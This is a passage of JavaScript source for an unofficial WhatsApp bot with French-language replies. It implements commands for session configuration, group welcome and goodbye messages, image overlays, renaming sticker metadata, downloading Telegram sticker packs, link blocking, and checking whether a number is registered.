    const pretty = JSON.stringify(report, null, 2);
    const MAX_LEN = 1500;
    if (pretty.length <= MAX_LEN) {
      await socket.sendMessage(sender, { text: `🔍 Résultat de l'inspection :\n\n${pretty}` }, { quoted: msg });
    } else {
      // découper en plusieurs messages si trop long
      const chunks = [];
      for (let i = 0; i < pretty.length; i += MAX_LEN) chunks.push(pretty.slice(i, i + MAX_LEN));
      await socket.sendMessage(sender, { text: '🔍 Rapport trop long, envoi en plusieurs parties...' }, { quoted: msg });
      for (const c of chunks) {
        await socket.sendMessage(sender, { text: '```json\n' + c + '\n```' }, { quoted: msg });
      }
    }

  } catch (err) {
    console.error('[DETECT CASE ERROR]', err);
    try {
      await socket.sendMessage(sender, { text: `❌ Erreur lors de l'inspection : ${err.message || err}` }, { quoted: msg });
    } catch (e) { /* ignore */ }
  }
  break;
}         
// ============ COMMANDES DE GROUPE ========
case 'config': {
  try {
    const sub = (args[0] || '').toLowerCase();
    const param = args.slice(1).join(' ').trim();
    const sanitized = (number || '').replace(/[^0-9]/g, '');
    const senderNum = (nowsender || '').split('@')[0];
    const ownerNum = config.OWNER_NUMBER.replace(/[^0-9]/g, '');

    if (senderNum !== sanitized && senderNum !== ownerNum) {
      const shonux = {
        key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_CONFIG_DENY1" },
        message: { contactMessage: { displayName: "𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓", vcard: `BEGIN:VCARD\nVERSION:3.0\nN:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓;;;;\nFN:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓\nEND:VCARD` } }
      };

      await socket.sendMessage(sender, { 
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🔒 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐂𝐎𝐍𝐅𝐈𝐆*
│. ˚˖𓍢ִ໋❌ ᴘᴇʀᴍɪssɪᴏɴ ᴅᴇɴɪᴇᴅ
│. ˚˖𓍢ִ໋👑 ᴏɴʟʏ ᴏᴡɴᴇʀ ᴏʀ sᴇssɪᴏɴ ᴏᴡɴᴇʀ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: shonux });

      break;
    }

    let cfg = await loadUserConfigFromMongo(sanitized) || {};

    switch (sub) {

      case 'autoview': {
        const val = (args[1] || '').toLowerCase();
        if (val === 'on' || val === 'off') {
          cfg.AUTO_VIEW_STATUS = val === 'on';
          await setUserConfigInMongo(sanitized, cfg);

          await socket.sendMessage(sender, {
            text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋⚙️ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐂𝐎𝐍𝐅𝐈𝐆*
│. ˚˖𓍢ִ໋🔁 ᴀᴜᴛᴏᴠɪᴇᴡ ᴍɪs à ᴊᴏᴜʀ
│. ˚˖𓍢ִ໋⚡ ᴍᴏᴅᴇ : ${cfg.AUTO_VIEW_STATUS ? 'ON' : 'OFF'}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
          }, { quoted: msg });

        } else {
          await socket.sendMessage(sender, {
            text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋⚙️ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐂𝐎𝐍𝐅𝐈𝐆*
│. ˚˖𓍢ִ໋📌 ᴜsᴀɢᴇ : .config autoview on|off
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
          }, { quoted: msg });
        }
        break;
      }

      case 'autolike': {
        const val = (args[1] || '').toLowerCase();
        if (val === 'on' || val === 'off') {
          cfg.AUTO_LIKE_STATUS = val === 'on';
          await setUserConfigInMongo(sanitized, cfg);

          await socket.sendMessage(sender, {
            text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❤️ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐂𝐎𝐍𝐅𝐈𝐆*
│. ˚˖𓍢ִ໋🔁 ᴀᴜᴛᴏʟɪᴋᴇ ᴍɪs à ᴊᴏᴜʀ
│. ˚˖𓍢ִ໋⚡ ᴍᴏᴅᴇ : ${cfg.AUTO_LIKE_STATUS ? 'ON' : 'OFF'}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
          }, { quoted: msg });

        } else {
          await socket.sendMessage(sender, {
            text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❤️ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐂𝐎𝐍𝐅𝐈𝐆*
│. ˚˖𓍢ִ໋📌 ᴜsᴀɢᴇ : .config autolike on|off
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
          }, { quoted: msg });
        }
        break;
      }

      case 'autorec': {
        const val = (args[1] || '').toLowerCase();
        if (val === 'on' || val === 'off') {
          cfg.AUTO_RECORDING = val === 'on';
          await setUserConfigInMongo(sanitized, cfg);

          await socket.sendMessage(sender, {
            text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🎥 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐂𝐎𝐍𝐅𝐈𝐆*
│. ˚˖𓍢ִ໋🔁 ᴀᴜᴛᴏʀᴇᴄ ᴍɪs à ᴊᴏᴜʀ
│. ˚˖𓍢ִ໋⚡ ᴍᴏᴅᴇ : ${cfg.AUTO_RECORDING ? 'ON' : 'OFF'}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
          }, { quoted: msg });

        } else {
          await socket.sendMessage(sender, {
            text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🎥 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐂𝐎𝐍𝐅𝐈𝐆*
│. ˚˖𓍢ִ໋📌 ᴜsᴀɢᴇ : .config autorec on|off
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
          }, { quoted: msg });
        }
        break;
      }

      case 'setemoji': {
        const emojis = param.split(/\s+/).filter(Boolean);
        cfg.AUTO_LIKE_EMOJI = emojis;
        await setUserConfigInMongo(sanitized, cfg);

        await socket.sendMessage(sender, {
          text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋😀 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐂𝐎𝐍𝐅𝐈𝐆*
│. ˚˖𓍢ִ໋🔁 ᴇᴍᴏᴊɪs ᴍɪs à ᴊᴏᴜʀ
│. ˚˖𓍢ִ໋📌 ${emojis.join(' ')}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        }, { quoted: msg });

        break;
      }

      

      case 'show':
      case 'get': {
        const merged = { 
          AUTO_VIEW_STATUS: typeof cfg.AUTO_VIEW_STATUS === 'undefined' ? true : cfg.AUTO_VIEW_STATUS,
          AUTO_LIKE_STATUS: typeof cfg.AUTO_LIKE_STATUS === 'undefined' ? true : cfg.AUTO_LIKE_STATUS,
          AUTO_RECORDING: typeof cfg.AUTO_RECORDING === 'undefined' ? false : cfg.AUTO_RECORDING,
          AUTO_LIKE_EMOJI: Array.isArray(cfg.AUTO_LIKE_EMOJI) && cfg.AUTO_LIKE_EMOJI.length ? cfg.AUTO_LIKE_EMOJI : ['🐉','🔥','💀','👑','💪','😎','🇭🇹','⚡','🩸','❤️'],
          PREFIX: cfg.PREFIX || '.',
          antidelete: cfg.antidelete === true
        };

        await socket.sendMessage(sender, {
          text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋⚙️ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐂𝐎𝐍𝐅𝐈𝐆*
│. ˚˖𓍢ִ໋📊 sᴇssɪᴏɴ sᴛᴀᴛᴜs
│. ˚˖𓍢ִ໋👁️ ᴀᴜᴛᴏᴠɪᴇᴡ : ${merged.AUTO_VIEW_STATUS}
│. ˚˖𓍢ִ໋❤️ ᴀᴜᴛᴏʟɪᴋᴇ : ${merged.AUTO_LIKE_STATUS}
│. ˚˖𓍢ִ໋🎥 ᴀᴜᴛᴏʀᴇᴄ : ${merged.AUTO_RECORDING}
│. ˚˖𓍢ִ໋😀 ᴇᴍᴏᴊɪs : ${merged.AUTO_LIKE_EMOJI.join(' ')}
│. ˚˖𓍢ִ໋⌨️ ᴘʀᴇғɪx : ${merged.PREFIX}
│. ˚˖𓍢ִ໋🛡️ ᴀɴᴛɪᴅᴇʟᴇᴛᴇ : ${merged.antidelete ? 'ON' : 'OFF'}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        }, { quoted: msg });

        break;
      }

      default: {
        await socket.sendMessage(sender, {
          text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋⚙️ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐂𝐎𝐍𝐅𝐈𝐆*
│. ˚˖𓍢ִ໋📌 ᴄᴏᴍᴍᴀɴᴅs :
│. ˚˖𓍢ִ໋   .config autoview on|off
│. ˚˖𓍢ִ໋   .config autolike on|off
│. ˚˖𓍢ִ໋   .config autorec on|off
│. ˚˖𓍢ִ໋   .config setemoji ...
│. ˚˖𓍢ִ໋   .config setprefix .
│. ˚˖𓍢ִ໋   .config show
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        }, { quoted: msg });

        break;
      }
    }

  } catch (err) {
    console.error('config case error', err);
    await socket.sendMessage(sender, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋⚙️ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐂𝐎𝐍𝐅𝐈𝐆*
│. ˚˖𓍢ִ໋❌ ᴇʀʀᴇᴜʀ sʏsᴛᴇᴍ
│. ˚˖𓍢ִ໋📛 ${err.message || err}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
  }
  break;
}

// CASE: welcome
case 'welcome': {
  try {
    if (!from.endsWith('@g.us')) {
      await socket.sendMessage(from, { text: '❗ Cette commande fonctionne uniquement dans un groupe.' }, { quoted: msg });
      break;
    }

    const sub = (args[0] || '').toLowerCase();
    // .welcome on | off | status | set <message> | reset
    if (sub === 'on') {
      toggleWelcome(from, true);
      await socket.sendMessage(from, { text: '✅ Mode Welcome activé.' }, { quoted: msg });
    } else if (sub === 'off') {
      toggleWelcome(from, false);
      await socket.sendMessage(from, { text: '❌ Mode Welcome désactivé.' }, { quoted: msg });
    } else if (sub === 'status') {
      const state = isWelcomeEnabled(from) ? 'activé ✅' : 'désactivé ❌';
      await socket.sendMessage(from, { text: `ℹ️ Le mode Welcome est actuellement ${state}.` }, { quoted: msg });
    } else if (sub === 'set') {
      // .welcome set Ton message {user} {group}
      const template = args.slice(1).join(' ').trim();
      if (!template) {
        await socket.sendMessage(from, { text: `❗ Fournis le message après ${prefix}welcome set\nEx: ${prefix}welcome set Bienvenue {user} dans {group} !` }, { quoted: msg });
        break;
      }
      setWelcomeTemplate(from, template);
      await socket.sendMessage(from, { text: '✅ Message de bienvenue personnalisé enregistré.' }, { quoted: msg });
    } else if (sub === 'reset') {
      setWelcomeTemplate(from, null);
      await socket.sendMessage(from, { text: '♻️ Message de bienvenue réinitialisé au thème BaseBot par défaut.' }, { quoted: msg });
    } else {
      // aide rapide
      await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│Usage Welcome:
│${prefix}welcome on — activer
│${prefix}welcome off — désactiver
│${prefix}welcome status — état actuel
│${prefix}welcome set <message> — définir message (placeholders: {user}, {userName}, {group})
│${prefix}welcome reset — remettre le message par ᴅᴇ́ғᴀᴜᴛ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
    }
  } catch (err) {
    console.error('WELCOME CASE ERROR', err);
    await socket.sendMessage(from, { text: '❌ Erreur lors de la gestion du mode Welcome.' }, { quoted: msg });
  }
  break;
}


// CASE: goodbye
case 'goodbye': {
  try {
    if (!from.endsWith('@g.us')) {
      await socket.sendMessage(from, { text: '❗ Cette commande fonctionne uniquement dans un groupe.' }, { quoted: msg });
      break;
    }

    const sub = (args[0] || '').toLowerCase();
    // .goodbye on | off | status | set <message> | reset
    if (sub === 'on') {
      toggleGoodbye(from, true);
      await socket.sendMessage(from, { text: '✅ Mode Goodbye activé.' }, { quoted: msg });
    } else if (sub === 'off') {
      toggleGoodbye(from, false);
      await socket.sendMessage(from, { text: '❌ Mode Goodbye désactivé.' }, { quoted: msg });
    } else if (sub === 'status') {
      const state = isGoodbyeEnabled(from) ? 'activé ✅' : 'désactivé ❌';
      await socket.sendMessage(from, { text: `ℹ️ Le mode Goodbye est actuellement ${state}.` }, { quoted: msg });
    } else if (sub === 'set') {
      // .goodbye set Ton message {user} {group}
      const template = args.slice(1).join(' ').trim();
      if (!template) {
        await socket.sendMessage(from, { text: `❗ Fournis le message après ${prefix}goodbye set\nEx: ${prefix}goodbye set Au revoir {user}, bon vent !` }, { quoted: msg });
        break;
      }
      setGoodbyeTemplate(from, template);
      await socket.sendMessage(from, { text: '✅ Message d\'au revoir personnalisé enregistré.' }, { quoted: msg });
    } else if (sub === 'reset') {
      setGoodbyeTemplate(from, null);
      await socket.sendMessage(from, { text: '♻️ Message d\'au revoir réinitialisé au thème BaseBot par défaut.' }, { quoted: msg });
    } else {
      // aide rapide
      await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│${prefix}goodbye on — activer
│${prefix}goodbye off — désactiver
│${prefix}goodbye status — état actuel
│${prefix}goodbye set <message> — définir message (placeholders: {user}, {userName}, {group})
│${prefix}goodbye reset — remettre le message par ᴅᴇ́ғᴀᴜᴛ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
    }
  } catch (err) {
    console.error('GOODBYE CASE ERROR', err);
    await socket.sendMessage(from, { text: '❌ Erreur lors de la gestion du mode Goodbye.' }, { quoted: msg });
  }
  break;
}

case 'wasted': {
    try {
        const axios = require("axios");

        await socket.sendMessage(sender, {
            react: { text: "💀", key: msg.key }
        });

        let user =
            msg?.mentionedJid?.[0] ||
            msg?.message?.extendedTextMessage?.contextInfo?.participant ||
            msg?.key?.participant ||
            sender;

        let pfp = await socket.profilePictureUrl(user, "image")
            .catch(() => "https://i.imgur.com/2wzGhpF.jpeg");

        const api = `https://some-random-api.com/canvas/overlay/wasted?avatar=${encodeURIComponent(pfp)}`;

        const caption = `
╭┄┄『 𝐖𝐀𝐒𝐓𝐄𝐃 』
│ 💀  ᴛᴀʀɢᴇᴛ ᴇʟɪᴍɪɴᴀᴛᴇᴅ
│ 🌟 ʏᴏᴜ ᴡᴇʙ ɪs ᴏɴʟɪɴᴇ
│ ✨ ᴛʜᴇ ʙᴇsᴛ ʙᴏᴛ
╰┄┄┄┄┄┄┄┄┄┄┄ᕗ

> @${user.split("@")[0]} ɢᴏᴛ ᴡᴀsᴛᴇᴅ ☠️
`.trim();

        await socket.sendMessage(sender, {
            image: { url: api },
            caption,
            mentions: [user],
            buttons: [
                { buttonId: ".wasted", buttonText: { displayText: "🔁 ᴀɢᴀɪɴ" }, type: 1 },
                { buttonId: ".menu", buttonText: { displayText: "📜 ᴍᴇɴᴜ" }, type: 1 }
            ],
            headerType: 4
        }, { quoted: msg });

    } catch (e) {
        console.error("WASTED ERROR:", e);
    }
}
break;


case 'wanted': {
    try {
        const axios = require("axios");

        await socket.sendMessage(sender, {
            react: { text: "🏴‍☠️", key: msg.key }
        });

        let user =
            msg?.mentionedJid?.[0] ||
            msg?.message?.extendedTextMessage?.contextInfo?.participant ||
            msg?.key?.participant ||
            sender;

        let pfp = await socket.profilePictureUrl(user, "image")
            .catch(() => "https://files.catbox.moe/xsk3rl.jpg");

        const api = `https://api.popcat.xyz/wanted?image=${encodeURIComponent(pfp)}`;

        const caption = `
╭┄┄『 𝐖𝐀𝐍𝐓𝐄𝐃 』
│ 🏴‍☠️ ᴍᴏsᴛ ᴡᴀɴᴛᴇᴅ ᴄʀɪᴍɪɴᴀʟ
│ 🌟 ʏᴏᴜ ᴡᴇʙ ɪs ᴏɴʟɪɴᴇ
│ ✨ ᴛʜᴇ ʙᴇsᴛ ʙᴏᴛ
╰┄┄┄┄┄┄┄┄┄┄┄ᕗ

> @${user.split("@")[0]} ɪs ɴᴏᴡ ᴡᴀɴᴛᴇᴅ 🚨
`.trim();

        await socket.sendMessage(sender, {
            image: { url: api },
            caption,
            mentions: [user],
            buttons: [
                { buttonId: ".wanted", buttonText: { displayText: "🔁 ᴀɢᴀɪɴ" }, type: 1 },
                { buttonId: ".menu", buttonText: { displayText: "📜 ᴍᴇɴᴜ" }, type: 1 }
            ],
            headerType: 4
        }, { quoted: msg });

    } catch (e) {
        console.error("WANTED ERROR:", e);
    }
}
break;


// Case swgc à coller dans ton switch principal
// Utilise le module status.js et ton client nommé socket

// ===============================
// TAKE / STEAL / SWM
// ===============================

case 'take':
case 'wm': {
  try {
    const webp   = require('node-webpmux');
    const crypto = require('crypto');

    // ── Vérifier qu'il y a un sticker cité ──
    const quotedCtx = msg.message?.extendedTextMessage?.contextInfo;
    const quotedMsg = quotedCtx?.quotedMessage;

    const stickerMsg = quotedMsg?.stickerMessage
      || msg.message?.stickerMessage
      || null;

    if (!stickerMsg) {
      await socket.sendMessage(sender, {
        text: `╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n` +
              `│. ˚˖𓍢ִ໋ 🎨 *𝐘𝐎𝐔 𝐓𝐀𝐊𝐄*\n` +
              `│. ˚˖𓍢ִ໋ ❌ ʀᴇ́ᴘᴏɴᴅs ᴀ̀ ᴜɴ sᴛɪᴄᴋᴇʀ !\n` +
              `│. ˚˖𓍢ִ໋ *ᴜsᴀɢᴇ :*\n` +
              `│. ˚˖𓍢ִ໋  ${prefix}take → ᴛɪᴛʀᴇ = ᴛᴏɴ ɴᴏᴍ\n` +
              `│. ˚˖𓍢ִ໋  ${prefix}take <ᴛɪᴛʀᴇ> → ᴛɪᴛʀᴇ ᴘᴇʀsᴏ\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n` +
              `> ${config.BOT_FOOTER}`
      }, { quoted: msg });
      break;
    }

    const packname = args.join(' ').trim() || nowsender.split('@')[0];
    const author   = 'ѕтαʀ вσу';

    await socket.sendMessage(from, { react: { text: '🎨', key: msg.key } });

    // ── Télécharger le sticker ──
    const stream = await downloadContentFromMessage(stickerMsg, 'sticker');
    const chunks = [];
    for await (const chunk of stream) chunks.push(chunk);
    const stickerBuffer = Buffer.concat(chunks);

    if (!stickerBuffer || stickerBuffer.length === 0) {
      throw new Error('Téléchargement du sticker échoué.');
    }

    // ── addExif ──
    async function addExif(webpSticker, packName, authorName, categories = [''], extra = {}) {
      const img           = new webp.Image();
      const stickerPackId = crypto.randomBytes(32).toString('hex');
      const json          = {
        'sticker-pack-id': stickerPackId,
        'sticker-pack-name': packName,
        'sticker-pack-publisher': authorName,
        'emojis': categories,
        ...extra
      };
      const exifAttr   = Buffer.from([
        0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00,
        0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x16, 0x00, 0x00, 0x00
      ]);
      const jsonBuffer = Buffer.from(JSON.stringify(json), 'utf8');
      const exif       = Buffer.concat([exifAttr, jsonBuffer]);
      exif.writeUIntLE(jsonBuffer.length, 14, 4);
      await img.load(webpSticker);
      img.exif = exif;
      return await img.save(null);
    }

    const result = await addExif(stickerBuffer, packname, author);
    if (!result) throw new Error('Échec de l\'application des métadonnées.');

    await socket.sendMessage(sender, { sticker: result }, { quoted: msg });
    await socket.sendMessage(from, { react: { text: '✅', key: msg.key } });

  } catch (e) {
    console.error('[TAKE ERROR]', e);
    await socket.sendMessage(from, { react: { text: '❌', key: msg.key } });
    await socket.sendMessage(sender, {
      text: `❌ Échec du renommage.\n_${e.message || e}_`
    }, { quoted: msg });
  }
  break;
}

// ===============================
// TELEGRAM STICKER DOWNLOAD
// ===============================

case 'tgsticker':
case 'tgs':
case 'telesticker': {

  try {

    const axios =
      require("axios");

    // ================= REACT =================

    react("🧩");

    // ================= INPUT =================

    const input =
      args.join(" ").trim();

    // ================= CHECK =================

    if (!input) {

      react("❌");

      return await socket.sendMessage(
        from,
        {
          text:
`╭┈┈『 🧩 TGS STICKER 』
│
│ ❌ PROVIDE TELEGRAM
│ STICKER PACK LINK
│
│ 📌 EXAMPLE :
│ .tgsticker https://t.me/addstickers/OldCat
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ

> MADE IN BY YOU TECHX OFC`
        },
        { quoted: msg }
      );

    }

    // ================= EXTRACT PACK =================

    const match =
      input.match(
        /addstickers\/([^\/\s]+)/i
      );

    if (!match) {

      react("❌");

      return await socket.sendMessage(
        from,
        {
          text:
`╭┈┈『 ❌ INVALID LINK 』
│
│ ENTER A VALID
│ TELEGRAM STICKER URL
│
│ 📌 EXAMPLE :
│ https://t.me/addstickers/OldCat
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        },
        { quoted: msg }
      );

    }

    const packName =
      match[1];

    // ================= PROCESS =================

    await socket.sendMessage(
      from,
      {
        text:
`╭┈┈『 ⏳ PROCESSING 』
│
│ 🧩 DOWNLOADING
│ TELEGRAM STICKERS
│
│ 📦 PACK :
│ ${packName}
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      },
      { quoted: msg }
    );

    // ================= API =================

    const apiUrl =
      `https://api.akuari.my.id/downloader/telesticker?link=${encodeURIComponent(input)}`;

    const res =
      await axios.get(
        apiUrl,
        {
          timeout: 60000
        }
      );

    const data =
      res.data;

    // ================= CHECK =================

    if (
      !data ||
      !data.respon ||
      !Array.isArray(
        data.respon
      )
    ) {

      react("❌");

      return await socket.sendMessage(
        from,
        {
          text:
`╭┈┈『 ❌ ERROR 』
│
│ FAILED TO FETCH
│ TELEGRAM STICKERS
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        },
        { quoted: msg }
      );

    }

    // ================= LIMIT =================

    const stickers =
      data.respon.slice(0, 10);

    // ================= SEND INFO =================

    await socket.sendMessage(
      from,
      {
        text:
`╭┈┈『 ✅ TGS STICKERS 』
│
│ 📦 PACK : ${packName}
│ 🧩 TOTAL :
│ ${stickers.length} STICKERS
│
│ 🚀 SENDING...
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      },
      { quoted: msg }
    );

    // ================= SEND STICKERS =================

    for (const stk of stickers) {

      try {

        await socket.sendMessage(
          from,
          {

            sticker: {
              url:
                stk.url
            },

            contextInfo: {

              newsletterJid:
                "120363426341519710@newsletter",

              newsletterName:
                "𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓",

              externalAdReply: {

                title:
                  "ᴅєν уσυ тɢ sтɪᴄκᴇʀ",

                body:
                  "ᴘᴏᴡᴇʀᴇᴅ ʙʏ уσυ тє¢н",

                thumbnailUrl:
                  stk.url,

                mediaType: 1,

                renderLargerThumbnail: true,

                sourceUrl:
                  input

              }

            }

          },
          { quoted: msg }
        );

      } catch (err) {

        console.log(
          "Sticker Send Error =>",
          err
        );

      }

    }

    // ================= SUCCESS =================

    react("✅");

  } catch (e) {

    console.error(
      "TGSTICKER ERROR =>",
      e?.response?.data || e
    );

    react("❌");

    await socket.sendMessage(
      from,
      {
        text:
`╭┈┈『 ❌ ERROR 』
│
│ FAILED TO DOWNLOAD
│ TELEGRAM STICKERS
│
│ TRY AGAIN LATER
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      },
      { quoted: msg }
    );

  }

}
break;


case 'antilink': {
  try {
    if (!from.endsWith('@g.us')) {
      await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🔗 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐀𝐍𝐓𝐈𝐋𝐈𝐍𝐊*
│. ˚˖𓍢ִ໋❗ ɢʀᴏᴜᴘ ᴏɴʟʏ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
      break;
    }

    const arg = args[0]?.toLowerCase();

    if (arg === 'on') {
      toggleAntiLink(from, true);
      await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🔗 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐀𝐍𝐓𝐈𝐋𝐈𝐍𝐊*
│. ˚˖𓍢ִ໋✅ ᴀᴄᴛɪᴠᴀᴛᴇᴅ
│. ˚˖𓍢ִ໋🛡️ ʟɪɴᴋ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ᴏɴ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });

    } else if (arg === 'off') {
      toggleAntiLink(from, false);
      await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🔗 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐀𝐍𝐓𝐈𝐋𝐈𝐍𝐊*
│. ˚˖𓍢ִ໋❌ ᴅᴇᴀᴄᴛɪᴠᴀᴛᴇᴅ
│. ˚˖𓍢ִ໋🛡️ ʟɪɴᴋ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ᴏғғ
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });

    } else {
      const state = isAntiLinkEnabled(from) ? 'activé ✅' : 'désactivé ❌';

      await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🔗 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐀𝐍𝐓𝐈𝐋𝐈𝐍𝐊*
│. ˚˖𓍢ִ໋📊 sᴛᴀᴛᴜs : ${state}
│. ˚˖𓍢ִ໋⚙️ ᴄᴏᴍᴍᴀɴᴅ :
│. ˚˖𓍢ִ໋   .antilink on
│. ˚˖𓍢ִ໋   .antilink off
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
    }

  } catch (err) {
    console.error("ANTILINK CASE ERROR", err);
    await socket.sendMessage(from, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🔗 *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐀𝐍𝐓𝐈𝐋𝐈𝐍𝐊*
│. ˚˖𓍢ִ໋❌ ᴇʀʀᴇᴜʀ
│. ˚˖𓍢ִ໋📛 ${err.message || err}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
  }
  break;
}


 case 'checkban': {
  try {
    const target = (args[0] || '').replace(/[^0-9]/g, '');
    if (!target) {
      return await socket.sendMessage(sender, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🛡️ *𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐂𝐇𝐄𝐂𝐊𝐁𝐀𝐍*
│. ˚˖𓍢ִ໋❌ ɴᴜᴍᴇʀᴏ ʀᴇǫᴜɪʀᴇᴅ
│. ˚˖𓍢ִ໋📌 ${prefix}checkban 509xxxxxxx
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
    }

    let result;
    try {
      result = await socket.onWhatsApp(target + '@s.whatsapp.net');
    } catch (e) {
      console.error('[CHECKBAN ERROR]', e);
      result = null;
    }

    const shonux = {
      key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        fromMe: false,
        id: "META_AI_FAKE_ID_CHECKBAN"
      },
      message: {
        contactMessage: {
          displayName: '𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓',
          vcard:
`BEGIN:VCARD
VERSION:3.0
N:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓;;;;
FN:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓
ORG:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓
TEL;type=CELL;type=VOICE;waid=${target}:${target}
END:VCARD`
        }
      }
    };

    let reply;

    if (result && result.length > 0 && result[0]?.exists) {
      reply =
